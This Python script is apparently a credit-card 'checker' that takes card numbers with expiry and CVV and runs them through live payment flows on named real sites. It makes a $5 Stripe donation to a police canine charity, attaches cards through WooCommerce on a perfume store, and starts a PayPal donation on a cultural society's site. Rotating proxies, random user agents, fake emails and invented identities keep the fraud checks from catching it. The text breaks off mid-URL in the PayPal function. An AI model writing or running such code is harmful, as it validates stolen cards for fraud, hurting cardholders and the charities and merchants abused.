from bs4 import BeautifulSoup
import requests
import string,random
import re
import random
import string
import user_agent
import json
import time
from requests_toolbelt.multipart.encoder import MultipartEncoder
import re
import base64
from fake_useragent import UserAgent

def load_proxies(file_path="proxies.txt"):
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def build_proxy(proxy_line):
    host, port, user, password = proxy_line.split(":")
    proxy_url = f"http://{user}:{password}@{host}:{port}"
    return {
        "http": proxy_url,
        "https": proxy_url
    }
def Strip_charge5(ccx):
	card = ccx.strip()
	parts = re.split('[:|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvv = parts[3]
	proxies_list = load_proxies("proxies.txt")
	proxy_line = random.choice(proxies_list)
	proxies = build_proxy(proxy_line)
	r=requests.Session()
	r.proxies.update(proxies)
	user = UserAgent().chrome
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@yahoo.com"
	email = generate_random_account()
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Connection': 'keep-alive',
	
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'none',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': user,
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = r.get('https://donate.placentiak9foundation.org/', headers=headers)
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Referer': 'https://placentiak9foundation.org/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-site',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': user,
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = r.get('https://donate.placentiak9foundation.org/donations/donate/', cookies=r.cookies, headers=headers)
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Connection': 'keep-alive',
	
	    'Referer': 'https://donate.placentiak9foundation.org/donations/donate/',
	    'Sec-Fetch-Dest': 'iframe',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': user,
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'giveDonationFormInIframe': '1',
	}
	
	response = r.get('https://donate.placentiak9foundation.org/give/donate', params=params, cookies=r.cookies, headers=headers)
	html = response.text
	pk_match = re.search(r'data-publishable-key="([^"]+)"', html)
	
	if pk_match:
	    publishable_key = pk_match.group(1)
	else:
	    return "Not found key"
	acct_match = re.search(r'data-account="([^"]+)"', html)
	
	if acct_match:
	    account_id = acct_match.group(1)
	else:
	    return "Not found strip account"
	match = re.search(r'form-id=(\d+)', html)
	
	if match:
	    fid = match.group(1)
	else:
	    return  "form-id not found"
	
	
	match = re.search(
	    r'name=["\']give-form-hash["\']\s+value=["\']([^"\']+)["\']',
	    html
	)
	
	if match:
	    has = match.group(1)
	
	else:
	    return "give-form-hash not found"
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user,
	}
	
	data = f'type=card&billing_details[name]=raph+raph&billing_details[email]={email}&card[number]={n}&card[cvc]={cvv}&card[exp_month]={mm.zfill(2)}&card[exp_year]={yy}&guid=63c54951-26cf-4b38-95c5-a839e720a4156179d6&muid=42a9c2eb-6507-4d1e-8ef7-0a43da210dc8715470&sid=87581d44-9fee-4389-a136-c45daebb0354e05338&pasted_fields=number&payment_user_agent=stripe.js%2F35d1c775d8%3B+stripe-js-v3%2F35d1c775d8%3B+split-card-element&referrer=https%3A%2F%2Fdonate.placentiak9foundation.org&time_on_page=626356&client_attribution_metadata[client_session_id]=b589a149-51e2-44bb-843f-a0d8aade56d6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={publishable_key}&_stripe_account={account_id}'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://donate.placentiak9foundation.org',
	    'Referer': 'https://donate.placentiak9foundation.org/give/donate?form-id=8&payment-mode=stripe&level-id=custom&custom-amount=5.00&showDonationProcessingError=1&giveDonationFormInIframe=1',
	    'Sec-Fetch-Dest': 'iframe',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': user,
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'payment-mode': 'stripe',
	    'form-id': f'{fid}',
	}
	
	data = {
	    'give-honeypot': '',
	    'give-form-id-prefix': f'{fid}-1',
	    'give-form-id': '8',
	    'give-form-title': 'Placentia Police Canine Foundation Donate',
	    'give-current-url': 'https://donate.placentiak9foundation.org/donations/donate/',
	    'give-form-url': 'https://donate.placentiak9foundation.org/',
	    'give-form-minimum': '5.00',
	    'give-form-maximum': '999999.99',
	    'give-form-hash': f'{has}',
	    'give-price-id': 'custom',
	    'give-recurring-logged-in-only': '',
	    'give-logged-in-only': '1',
	    '_give_is_donation_recurring': '0',
	    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
	    'give-amount': '5.00',
	    'give_stripe_payment_method': f'{id}',
	    'give_first': 'raph',
	    'give_last': 'raph',
	    'give_company_option': 'no',
	    'give_company_name': '',
	    'give_email': f'{email}',
	    'payment-mode': 'stripe',
	    'card_name': 'taphael',
	    'give_agree_to_terms': '1',
	    'give_action': 'purchase',
	    'give-gateway': 'stripe',
	    'give_embed_form': '1',
	}
	
	response = r.post('https://donate.placentiak9foundation.org/', params=params, cookies=r.cookies, headers=headers, data=data)
	html=response.text
	match = re.search(r'<p>(.*?)</p>', html, re.S | re.I)
	
	match = re.search(r'<p>.*?<strong>.*?</strong>:(.*?)</p>', html, re.DOTALL)
	if match:
	    message = match.group(1).strip()
	    if "There was an issue with your donation transaction: Your card was declined.<br>Please check your payment method or contact your card issuer for assistance. If the issue persists, try a different payment method or contact the site administrators." in message:
	    	return "Your card was declined."
	    else:
	    	return message
	else:
		return html
def strip_auth(ccx):
    time.sleep(5)
    ccx = ccx.strip()
    parts = re.split(r'[|/:\\]+', ccx)
    parts = parts[:4]
    n  = parts[0].strip()
    mm = parts[1].strip()
    yy = parts[2].strip()
    cvc = parts[3].strip() 
    yy = yy[-2:]



    
    ua = UserAgent()
    user = ua.random
    r = requests.session()
    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"

    email = generate_random_account()
    time.sleep(0.5)
    headers = {
    'authority': 'almadinaperfumes.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
	}
	
    response = r.get('https://almadinaperfumes.com/', headers=headers)
    time.sleep(0.3)
    headers = {
    'authority': 'almadinaperfumes.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://almadinaperfumes.com/my-account/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
	}
	
    response = r.get('https://almadinaperfumes.com/my-account/', cookies=r.cookies, headers=headers)
    res=re.search(r'name="woocommerce-register-nonce" value="(.*?)"',response.text)
    if res:
    	register=res.group(1)
    else:
    	return 'CANT FIND REGISTER'
    time.sleep(0.2)
    headers = {
	    'authority': 'almadinaperfumes.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://almadinaperfumes.com',
	    'referer': 'https://almadinaperfumes.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
    data = {
	    'email': email,
	    'password': 'raphAel2719@&#2',
	    'wc_order_attribution_source_type': 'organic',
	    'wc_order_attribution_referrer': 'https://www.google.com/',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': 'google',
	    'wc_order_attribution_utm_medium': 'organic',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://almadinaperfumes.com/privacy-and-cookie-policy/',
	    'wc_order_attribution_session_pages': '10',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	}
	
    response = r.post('https://almadinaperfumes.com/my-account/', cookies=r.cookies, headers=headers, data=data)
    time.sleep(0.1)
    headers = {
	    'authority': 'almadinaperfumes.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://almadinaperfumes.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
    response = r.get('https://almadinaperfumes.com/my-account/', cookies=r.cookies, headers=headers)
    time.sleep(0.2)
    headers = {
	    'authority': 'almadinaperfumes.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://almadinaperfumes.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
    response = r.get('https://almadinaperfumes.com/my-account/payment-methods/', cookies=r.cookies, headers=headers)
	
    headers = {
	    'authority': 'almadinaperfumes.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://almadinaperfumes.com/my-account/payment-methods/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
    response = r.get('https://almadinaperfumes.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
    ky = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', response.text)
    if ky:
    	key=ky.group(1)
    	accid=re.search(r'"accountId"\s*:\s*"([^"]+)"', response.text).group(1)
    	step=re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', response.text).group(1)
    	add =re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text).group(1)
    	headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': user,
		}
		
    	data = f'billing_details[name]=+&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=10080&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm.zfill(2)}&allow_redisplay=unspecified&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Falmadinaperfumes.com&time_on_page=34222&client_attribution_metadata[client_session_id]=6388e824-59db-43ea-9e48-4666aab528e3&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=d0c50f41-91ef-4908-b302-0be5436ff2a2&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=63c54951-26cf-4b38-95c5-a839e720a4156179d6&muid=99f682e7-8ed1-47c8-8b37-4121858485ca9d187f&sid=8d04790a-ae50-48b3-877d-3b9ffb83afb06b3225&key={key}&_stripe_account={accid}'
		
    	response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    	id =response.json()['id']
    	data = MultipartEncoder({
		    'action': (None, 'create_setup_intent'),
		    'wcpay-payment-method': (None, id),
		    '_ajax_nonce': (None, step),
		})
		
    	headers = {
		    'authority': 'almadinaperfumes.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': data.content_type,
		    'origin': 'https://almadinaperfumes.com',
		    'referer': 'https://almadinaperfumes.com/my-account/add-payment-method/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': user,
		}
    	response = r.post('https://almadinaperfumes.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    	if 'error' in response.json()['data']:
    		return response.json()['data']['error']['message']
    	else:
    		ids = response.json()['data']['id']
    		time.sleep(0.3)
    		headers = {
			    'authority': 'almadinaperfumes.com',
			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'cache-control': 'max-age=0',
			    'content-type': 'application/x-www-form-urlencoded',
			    'origin': 'https://almadinaperfumes.com',
			    'referer': 'https://almadinaperfumes.com/my-account/add-payment-method/',
			    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'document',
			    'sec-fetch-mode': 'navigate',
			    'sec-fetch-site': 'same-origin',
			    'sec-fetch-user': '?1',
			    'upgrade-insecure-requests': '1',
			    'user-agent': user,
			}
    		data = {
			    'payment_method': 'woocommerce_payments',
			    'wc-woocommerce_payments-new-payment-method': 'true',
			    'woocommerce-add-payment-method-nonce': add,
			    '_wp_http_referer': '/my-account/add-payment-method/',
			    'woocommerce_add_payment_method': '1',
			    'wcpay-payment-method': id,
		#	    'wcpay-fingerprint': 'c2f7cc08bc35ce3e0e94d1c79fbae4c7',
			    'wcpay-fraud-prevention-token': '',
			    'wcpay-setup-intent': ids,
			}
    		response = r.post(
			    'https://almadinaperfumes.com/my-account/add-payment-method/',
			    cookies=r.cookies,
			    headers=headers,
			    data=data,
			)
    		ad=re.search(r'Payment method successfully added\.', response.text)
    		en=re.search(r'Failed to add the provided payment method\. Please try again later', response.text)
    		if ad:
    			return 'added'
    		elif en:
    			return 'Failed_to_add_3DS'
    		else:
    			print(response.text)
    			return 'ERROR_IN_CARD'
    else:
    	return 'ERROR_TOKEN_LOGIN'

def paypal(ccx):
	card = ccx.strip()
	parts = re.split(r'[|/:\\]+', ccx)
	parts = parts[:4]
	n=parts[0].strip()
	mm = parts[1].strip()
	yy = parts[2].strip()
	cvc =parts[3].strip() 
	mm = mm.zfill(2)
	if len(yy) == 4 and yy.startswith("20"):
		yy = yy[2:]
		return n, mm, yy, cvc
	
	
	if len(mm) == 1:
		mm = f'0{mm}'
	
	if "20" in yy:
		yy = yy.split("20")[1]	
	user = user_agent.generate_user_agent()
	r = requests.session()
	
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
	    
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    return first_name, last_name
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
	
	r = requests.session()
	headers = {
    'authority': 'asiasociety.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

	response = r.get('https://asiasociety.org/hong-kong/donate-paypal-or-debitcredit-card', cookies=r.cookies, headers=headers)
	
	headers = {
    'authority': 'www.paypal.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://asiasociety.org/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

	response = r.get(
    f'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&style.shouldApplyRebrandedStyles=false&style.isButtonColorABTestMerchant=false&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_798c21dff0_mtg6mdk6mdc&buttonSize=large&customerId=&clientID=AQL7ArMZBhEd8hIjSM85XzVu94Qh7Bd6To1hx6h3qOm6s_NV-woi32ic3uv2PirvFtdsbehFlxOEI4h_&clientMetadataID=uid_34f814f66d_mtg6mdg6ntc&commit=true&components.0=buttons&currency=HKD&debug=false&disableSetCookie=true&eagerOrderCreation=false&enableFunding.0=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.spbEagerOrderCreation=false&experiment.venmoWebEnabled=false&experiment.isWebViewEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.isPaypalRebrandABTestEnabled=false&experiment.defaultBlueButtonColor=defaultBlue_lightBlue&experiment.venmoEnableWebOnNonNativeBrowser=false&experiment.paypalCreditButtonCreateVaultSetupTokenExists=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJtYWVzdHJvIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaW5lcnMiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImN1cCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWx